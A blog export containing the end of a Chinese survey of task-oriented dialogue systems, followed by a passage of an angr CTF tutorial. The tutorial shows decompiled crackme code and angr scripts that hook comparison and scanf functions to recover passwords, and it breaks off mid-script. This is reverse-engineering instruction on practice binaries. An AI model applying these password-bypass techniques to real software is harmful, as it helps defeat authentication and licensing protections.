知识库整合问题：任务型对话系统通过查询知识库检索实体生成响应，在pipeline的方法中，查询根据对话状态跟踪模块的结果进行构造，而在end-to-end的方法中，如何有效整合知识库内容进行应答是一个问题。</p><p>以下根据上述三大挑战，对近三年来面向任务的对话系统的主要研究进行梳理。</p><h3><span id="pdui-shu-ju-you-xiao-xing-wen-ti-de-yan-jiu">对数据有效性问题的研究</span><a href="#pdui-shu-ju-you-xiao-xing-wen-ti-de-yan-jiu" class="header-anchor">#</a></h3><p>​ 近几年的研究工作在数据有效性问题上，都选择先找出不同领域间共有的数据进行较为通用的学习，并在迁移到新领域内时进行领域内特有数据的学习，从而提高已有数据的在其他领域内的有效性。</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-132622.jpg" alt="img"></p><center>图4.1 DF-Net实验结果[3]</center>​ 在对数据有效性问题的研究中，Henderson M等人[2]受预训练模型的启发，将预训练应用于任务型对话系统中，首先在大量通用的语料库上进行对话系统的预训练，然后在移植到特定领域内进行训练时，只需要加入相对少量的特定领域内数据对预训练模型进行调优即可，结果表明在面向任务的对话系统中，这样的预训练十分有效。同样是为了提高数据的有效性，Qin L等人[3]将领域内知识分为领域间共有的知识和领域内特有的知识两类，在端到端的对话系统中提出了shared-private框架显式的学习领域间共有的知识和领域内特有的知识，并提出了一种动态融合网络(Dynamic Fusion Network)动态探索目标领域和各个领域之间知识的相关性，其在SMD和Multi-MOZ数据集上的测试结果也表明论文的模型存在较好的可迁移性并优于Mem2Seq等模型（图4.1）。<p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-132638.jpg" alt="img"></p><center>图4.2 Huang X等人提出的MALA方法实验结果[3]</center>​ Huang X等人[4]提出了MALA方法，其想法与Qin L等人[3]存在一定的共通之处，但是是区分领域间共有隐藏动作和领域内特有的隐藏动作。在任务导向的对话系统中需要提取用户的需求，之前的方法是将其分为对话规划和外部实现两部分。对话规划找到能够完成用户需求的动作，而外部实现将动作转换为对话响应。因此一些论文通过VAE(Variational AutoEncoder)获取隐藏的动作表示。由于学习隐藏动作需要对对话状态进行标注，而很多领域并不存在这样的数据集，因此Huang X等人希望在状态标注层面提高数据的有效性。例如在预定酒店和预定景点都存在询问价格的对话状态，这就是不同领域间共有的对话状态标注。共有的内容在领域间可以通用，而在应用于其他领域时，只需要学习领域内特有的对话状态即可。实验结果表明，这样的方法也能显著提高数据跨领域的有效性（图4.2）。<h3><span id="pdui-duo-lun-dui-hua-ce-lue-de-yan-jiu">对多轮对话策略的研究</span><a href="#pdui-duo-lun-dui-hua-ce-lue-de-yan-jiu" class="header-anchor">#</a></h3><p>​ 在多轮对话时，对话管理模块不仅需要处理当前对话，也要处理之前的历史对话，因此对于对话策略的研究能够在多轮对话中提高对话系统的性能。</p><p>​ Lei W等人[5]提出了Sequicity模型(图4.3)，将面向任务的地话系统中的状态跟踪和文本生成通过sequence-to-sequence完成，并提出了Two Stage CopyNet模型，减少了计算的复杂度。实验表明，该方法在大规模预料库中优于baseline并且能够较好的处理OOV(Out of Vocabulary)问题(图4.4)。</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-132649.jpg" alt="img"></p><center>图4.3 Lei W提出的Sequicity模型[5]</center>​ 整体流程如下，左侧为示例对话，右侧为Sequicity模型工作过程：<p>​ (1) 第一步: 根据上一轮对话的belief span，上一轮对话的response和本轮的对话内容，生成本轮对话的belief span。</p><p>​ (2) 第二步：在生成response时，根据上一轮对话的belief span，上一轮对话的response和本轮的对话内容，本轮的belief span和知识库获得本轮的response。</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-132656.jpg" alt="img"></p><center>图4.4 Sequicity模型OOV测试结果[5]</center>​ 为了更好的处理全局的对话信息，Zhang Z等人[6]提出了记忆型增强型对话管理模型(MAD)，引入了记忆控制模块和两个记忆网络，分别处理对话状态中与语义槽值相关的信息和对话逻辑信息。同时，引入了基于槽值的Attention机制，使得不同槽值的状态能够更加集中于槽相关的信息，实验表明，该模型能够有效提升对话管理的性能。如图4.5所示，在第t轮对话中，模型<p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-132703.jpg" alt="img"></p><center>图4.5 Zhang Z等人提出的记忆力增强型对话管理模型[6]</center>​ 将当前的用户输入和之前的系统响应作为输入，对下一个对话行为进行预测。Slot-value momery的值根据用户输入的Attention进行更新，而External Memory由Memory控制器进行读取和更新。最后分类器根据Memory控制器和两个Memory的输出预测系统在t时刻的对话行为。实验结果表明，MAD方法在DSTC等数据集上都取得了不俗的表现(图4.6)。<p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-132712.jpg" alt="img"></p><center>图4.6 MAD方法实验结果[6]</center><h3><span id="pdui-zhi-shi-ku-zheng-he-wen-ti-de-yan-jiu">对知识库整合问题的研究</span><a href="#pdui-zhi-shi-ku-zheng-he-wen-ti-de-yan-jiu" class="header-anchor">#</a></h3><p>在end-to-end的方法中，如何有效的利用知识库的知识整合到模型中是一个问题，在之前的RNN编解码器模型和结合Attention机制的RNN编解码器模型中，都存在以下问题：(1) 希望将外部知识库整合进RNN隐藏层中，但RNN处理长序列不稳定；(2) 处理长序列十分耗时，尤其是在加入了Attention机制的情况下。</p><p>为了解决这一问题，Madotto A等人[7]在MemNNs的基础上提出了Mem2Seq模型，并使用multi-hop attention机制和pointer network。其优点有：(1)能够有效的融入知识库信息;(2)能学习如何生成动态查询来控制内存访问;(3)训练速度更快并在bAbI、DSTC、In-Car数据集上的表现优于之前的模型（图4.7）。</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-132718.jpg" alt="img"></p><center>图4.7 Mem2Seq模型实验结果[7]</center>但是Mem2Seq等方法中的Memory机制也存在两个问题：(1)使用三元组表示知识使得Memory很难推理相关属性之间的关系(2)将对话上下文和知识库组合为同一Memory的一部分,使得Memory需要区分数据来自于知识库还是对话上下文，加大了推理的难度。为了解决这些问题，Reddy R等人[8]提出了多层的Memory结构模型。使用单独的Memory分别存储上下文和知识库的内容，为每种数据学习单独的Memory读取器。抛弃了之前的三元组知识表示形式，使用多层Memory结构，在每一层存储query、results和values，在自然层上对知识库结果进行编码。其在InCar、CamRest、Maluuba Frames数据集上的表现都优于Mem2Seq等baseline（图4.8）。<p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-132726.jpg" alt="img"></p><center>图4.8 Multi-Level Memory模型实验结果[8]</center>​ 现有的知识库往往十分庞大，因此很难完全融入到学习模型中，为了解决这一问题，Wu C S等人[9]提出了GLMP模型，通过全局Memory编码和本地Memory解码共享外部知识。首先由全局Memory编码器编码对话上下文，将结果写入外部知识库，并生成全局Memory指针，然后在解码阶段，本地Memory解码器首先生成简略回答，然后将其传入外部知识库进行筛选和查询，最后将返回的结果生成最终的回答。该方法在bAbI-OOV模型上实现了92%的准确度，超过Mem2Seq 7.5%（图4.9），并在SMD数据集上，也超过了baseline。<p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-132731.jpg" alt="img"></p><center>图 4.9 GLMP模型在bAbI数据集上的表现[9]</center>## 总结<p>​ 从对近年面向任务的对话系统研究的梳理和回顾中可以发现：</p><p>​ (1)在对数据的有效性问题的研究中，如何提高已有数据在新领域中有效性，减少人工构造新领域的数据量是一个热点和挑战。目前通用对话预训练结合新领域少量数据调优是主要的方法，在扩展到新领域时，结合领域间共有的隐式知识取得了比较好的效果。</p><p>​ (2)在对多轮对话管理问题的研究中，则主要研究如何在多轮对话中，更好的结合历史对话内容，提高全局的对话系统性能。</p><p>​ (3)在end-to-end的方法中对结合知识库问答问题的研究中，目前的研究主要还是在MemNNs的基础上对Memory机制进行改进，通过各种方法结合知识库知识和对话上下文给出更好的对话回答。</p><p>总体来说，面向任务的对话系统的研究仍有较长的路要走，我相信终有一天面向任务的对话系统能够完全代替人类进行任务型对话。</p><h2><span id="pcan-kao-wen-xian">参考文献</span><a href="#pcan-kao-wen-xian" class="header-anchor">#</a></h2><ul><li>[1] Zheng Zhang, Ryuichi Takanobu, Minlie Huang, Xiaoyan Zhu. Recent Advances and Challenges in Task-oriented Dialog System . arXiv preprint arXiv:2003.07490. 2020</li><li>[2] Henderson M, Vulić I, Gerz D, et al. Training neural response selection for task-oriented dialogue systems[J]. arXiv preprint arXiv:1906.01543, 2019.</li><li>[3] Qin L, Xu X, Che W, et al. Dynamic Fusion Network for Multi-Domain End-to-end Task-Oriented Dialog[J]. arXiv preprint arXiv:2004.11019, 2020.</li><li>[4] Huang X, Qi J, Sun Y, et al. MALA: Cross-Domain Dialogue Generation with Action Learning[J]. arXiv preprint arXiv:1912.08442, 2019.</li><li>[5] Lei W, Jin X, Kan M Y, et al. Sequicity: Simplifying task-oriented dialogue systems with single sequence-to-sequence architectures[C]//Proceedings of the 56th Annual Meeting of the Association for Computational Linguistics (Volume 1: Long Papers). 2018: 1437-1447.</li><li>[6] Zhang Z, Huang M, Zhao Z, et al. Memory-augmented dialogue management for task-oriented dialogue systems[J]. ACM Transactions on Information Systems (TOIS), 2019, 37(3): 1-30.</li><li>[7] Madotto A, Wu C S, Fung P. Mem2seq: Effectively incorporating knowledge bases into end-to-end task-oriented dialog systems[J]. arXiv preprint arXiv:1804.08217, 2018.</li><li>[8] Reddy R, Contractor D, Raghu D, et al. Multi-Level Memory for Task Oriented Dialogs[J]. arXiv preprint arXiv:1810.10647, 2018.</li><li>[9] Wu C S, Socher R, Xiong C. Global-to-local memory pointer networks for task-oriented dialogue[J]. arXiv preprint arXiv:1901.04713, 2019.</li></ul>]]></content>
      <categories>
        <category>AI</category>
        <category>NLP</category>
      </categories>
      <tags>
        <tag>AI</tag>
        <tag>NLP</tag>
      </tags>
  </entry>
  <entry>
    <title>跟着AngrCTF学Angr(2)</title>
    <url>/eefc86dd.html</url>
    <content><![CDATA[<blockquote><p>第二部分主要是hook相关的内容的学习</p></blockquote><p><strong>PS</strong>:</p><p><code>angr == 8.20.1.7</code></p><p>二进制文件和脚本存储于<code>https://github.com/ycdxsb/Challenges/tree/master/angr_ctf</code></p><a id="more"></a><h3><span id="ptian-jia-tiao-jian-yue-shu">添加条件约束</span><a href="#ptian-jia-tiao-jian-yue-shu" class="header-anchor">#</a></h3><ul><li><code>08_angr_constraints</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">_BOOL4 __cdecl <span class="title">check_equals_DQCSFFYXVUJIKEBQ</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+8h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(i + a1) == *(_BYTE *)(i + <span class="number">134520896</span>) )</span><br><span class="line">      ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 == a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于符号执行存在路径爆炸问题，在一些情况下，会出现路径爆炸的问题，比如上面的示例中，本来字符串一起比较即可，但由于实现中单字节比较，就会出现2的16次方的分支，因此选择自己添加条件约束是十分明智的。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    start_address = <span class="number">0x8048625</span></span><br><span class="line">    init_state = project.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">    password = claripy.BVS(<span class="string">'password'</span>, <span class="number">0x10</span>*<span class="number">8</span>)</span><br><span class="line">    password_addr = <span class="number">0x804A050</span></span><br><span class="line">    init_state.memory.store(password_addr, password)</span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    sim.explore(find=<span class="number">0x804866C</span>)</span><br><span class="line">    <span class="keyword">if</span> sim.found:</span><br><span class="line">        solution_state = sim.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        constrained_parameter_address = <span class="number">0x804A050</span></span><br><span class="line">        constrained_parameter_size_bytes = <span class="number">0x10</span></span><br><span class="line">        constrained_parameter_bitvector = solution_state.memory.load(</span><br><span class="line">            constrained_parameter_address,</span><br><span class="line">            constrained_parameter_size_bytes</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        constrained_parameter_desired_value = <span class="string">"DQCSFFYXVUJIKEBQ"</span></span><br><span class="line">        constraint_expression = constrained_parameter_bitvector == constrained_parameter_desired_value</span><br><span class="line">        solution_state.add_constraints(</span><br><span class="line">            constrained_parameter_bitvector == constrained_parameter_desired_value)</span><br><span class="line">        solution = solution_state.se.eval(</span><br><span class="line">            password, cast_to=bytes)  <span class="comment"># 求解得到满足上述条件的输入</span></span><br><span class="line">        print(solution)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span>(len(sys.argv) != <span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">    filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(filepath)</span><br></pre></td></tr></table></figure><h3><span id="pjian-dan-hook">简单Hook</span><a href="#pjian-dan-hook" class="header-anchor">#</a></h3><ul><li><code>09_angr_hooks</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BOOL4 v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  qmemcpy(password, <span class="string">"JRZSQFKOVMSDNCWS"</span>, <span class="number">16</span>);</span><br><span class="line">  <span class="built_in">memset</span>(<span class="built_in">buffer</span>, <span class="number">0</span>, <span class="number">0x11</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter the password: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%16s"</span>, <span class="built_in">buffer</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + <span class="number">0x804A054</span>) = complex_function(*(<span class="keyword">char</span> *)(i + <span class="number">0x804A054</span>), <span class="number">18</span> - i);</span><br><span class="line">  equals = check_equals_JRZSQFKOVMSDNCWS((<span class="keyword">int</span>)<span class="built_in">buffer</span>, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">    *(_BYTE *)(j + <span class="number">0x804A044</span>) = complex_function(*(<span class="keyword">char</span> *)(j + <span class="number">0x804A044</span>), j + <span class="number">9</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%16s"</span>, <span class="built_in">buffer</span>);</span><br><span class="line">  v3 = equals &amp;&amp; !<span class="built_in">strncmp</span>(<span class="built_in">buffer</span>, password, <span class="number">0x10</span>u);</span><br><span class="line">  equals = v3;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Good Job."</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again."</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样是为了解决路径爆炸问题，但由于后续还有其他操作，所以我们在这里需要hook掉比较函数，然后继续向下执行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    init_state = project.factory.entry_state()</span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    check_equals_called_address = <span class="number">0x80486B3</span></span><br><span class="line">    instruction_to_skip_length = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @project.hook(check_equals_called_address, length=instruction_to_skip_length)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">skip_check_equals_</span><span class="params">(state)</span>:</span></span><br><span class="line">        user_input_buffer_address = <span class="number">0x804A054</span></span><br><span class="line">        user_input_buffer_length = <span class="number">0x10</span></span><br><span class="line">        user_input_string = state.memory.load(</span><br><span class="line">            user_input_buffer_address, user_input_buffer_length)</span><br><span class="line">        check_against_string = <span class="string">"JRZSQFKOVMSDNCWS"</span></span><br><span class="line">        state.regs.eax = claripy.If(</span><br><span class="line">            user_input_string == check_against_string, claripy.BVV(<span class="number">1</span>, <span class="number">32</span>), claripy.BVV(<span class="number">0</span>, <span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">    simulation = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    simulation.explore(find=find, avoid=avoid)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">        print(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  <span class="keyword">if</span>(len(sys.argv) != <span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">  filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">  main(filepath)</span><br></pre></td></tr></table></figure><p>Hook时，首先要确定位置和hook掉函数占用的指令数，然后自己实现hook的函数，需要注意的是，返回值在eax寄存器中，需要进行符号化处理</p><h3><span id="pjin-jie-hook">进阶Hook</span><a href="#pjin-jie-hook" class="header-anchor">#</a></h3><ul><li><code>10_angr_simprocedures</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+20h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">17</span>]; <span class="comment">// [esp+2Bh] [ebp-1Dh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;password, <span class="string">"JWRJJJAJTWHCQHPZ"</span>, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x11</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter the password: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%16s"</span>, s);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    s[i] = complex_function(s[i], <span class="number">18</span> - i);</span><br><span class="line">  <span class="keyword">if</span> ( check_equals_JWRJJJAJTWHCQHPZ((<span class="keyword">int</span>)s, <span class="number">0x10</span>u) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Good Job."</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again."</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在一些时候，如果需要Hook的函数存在于多个地方，我们不可能一个一个的去Hook，所以按函数的符号名Hook是比较科学的方法，虽然示例中只出现了一次，但这次我们通过函数符号进行Hook</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    init_state = project.factory.entry_state()</span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ReplacementCheckEquals</span><span class="params">(angr.SimProcedure)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self,data_addr,length)</span>:</span></span><br><span class="line">            user_input_string = self.state.memory.load(data_addr,length)</span><br><span class="line">            check_against_string = <span class="string">"JWRJJJAJTWHCQHPZ"</span></span><br><span class="line">            <span class="keyword">return</span> claripy.If(user_input_string==check_against_string,claripy.BVV(<span class="number">1</span>,<span class="number">32</span>),claripy.BVV(<span class="number">0</span>,<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">    check_equals_symbol = <span class="string">"check_equals_JWRJJJAJTWHCQHPZ"</span></span><br><span class="line">    project.hook_symbol(check_equals_symbol,ReplacementCheckEquals())</span><br><span class="line"></span><br><span class="line">    simulation = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Good Job."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">avoid</span><span class="params">(state)</span>:</span></span><br><span class="line">        stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b"Try again."</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">    simulation.explore(find=find, avoid=avoid)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">        print(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not find the solution'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  <span class="keyword">if</span>(len(sys.argv) != <span class="number">2</span>):</span><br><span class="line">        print(<span class="string">'usage:python angr_basic.py filepath'</span>)</span><br><span class="line">  filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">  main(filepath)</span><br></pre></td></tr></table></figure><h3><span id="phook-scanf-han-shu">Hook scanf函数</span><a href="#phook-scanf-han-shu" class="header-anchor">#</a></h3><ul><li><code>11_angr_sim_scanf</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">cint __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BOOL4 v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+20h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">4</span>]; <span class="comment">// [esp+28h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+2Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x14</span>u);</span><br><span class="line">  *(_DWORD *)s = <span class="number">1329940303</span>;</span><br><span class="line">  v7 = <span class="number">1179340618</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    s[i] = complex_function(s[i], i);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter the password: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%u %u"</span>, buffer0, buffer1);</span><br><span class="line">  v3 = !<span class="built_in">strncmp</span>(buffer0, s, <span class="number">4u</span>) &amp;&amp; !<span class="built_in">strncmp</span>(buffer1, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v7, <span class="number">4u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Good Job."</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again."</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和前面很像，但这次需要hook我们最常用的scanf函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    project = angr.Project(filepath)</span><br><span class="line">    init_state = project.factory.entry_state()</span><br><span class="line">    sim = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ReplacementScanf</span><span class="params">(angr.SimProcedure)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self,format_string,buffer0_addr,buffer1_addr)</span>:</span></span><br><span class="line">            buffer0 = claripy.BVS(<span class="string">'buffer0'</span>,<span class="number">4</span>*<span class="number">8</span>)</span><br><span class="line">            buffer1 = claripy.BVS(<span class="string">'buffer1'</span>,<span class="number">4</span>*<span class="number">8</span>)</span><br><span class="line">            self.state.memory.store(buffer0_addr,buffer0,endness=project.arch.memory_endness)</span><br><span class="line">            self.state.memory.store(buffer1_addr,buffer1,endness=project.arch.memory_endness)</span><br><span class="line">            self.state.globals[<span class="string">'solution0'</span>] = buffer0</span><br><span class="line">            self.state.globals[<span class="string">'solution1'</span>] = buffer1</span><br><span class="line"></span><br><span class="line">    scanf_symbol = <span class="string">"__isoc99_scanf"</span></span><br><span class="line">    project.hook_symbol(scanf_symbol,ReplacementScanf())</span><br><span class="line"></span><br><span 